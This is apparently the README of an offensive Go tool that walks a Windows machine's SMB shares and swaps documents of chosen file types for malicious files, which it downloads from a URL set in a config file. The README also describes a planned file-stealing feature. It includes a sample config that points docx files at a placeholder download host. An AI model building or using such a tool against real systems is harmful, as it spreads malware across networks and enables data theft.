# SMB Share Poisoner

This tool will grab all shared folders from a Windows machine, then loop through each respective shared directory in search of files of interest to replace with a *malicious* one based off a file extension. It does so by parsing a config file which has the corresponding file extensions of interest.

The purpose of this tool is to aid in lateral movement & collection (future implementation). It does so by poisoning files of interest (EX: Document files) that a victim may send off to other individuals.

## Todo

- [ ] Implement a stealer functionality. As of now, it'll grab files of interest based on file extension & add them to a slice for exfiltration. But there's currently no means of exfiltration.

## Config File

The config file has 2 sections: **stealer** & **replacer**:

* **Stealer** defines file extensions for files that you wish to exfiltrate
	* You can define these by simply inputting the file extension in a comma-separated list format
* **Replacer** defines file extensions for files that you wish to replace with a malicious replacement file
	* You define these by inputting a file extension and defining where to download the malicious replacement file from

```
[stealer]
extensions = txt,docx,docm 

[replacer]
docx = http://<domain>/<file>
```

The config file must be in the same directory that `main.go` is ran from & must be named `config.ini`. This can be changed by modifying the source code though.
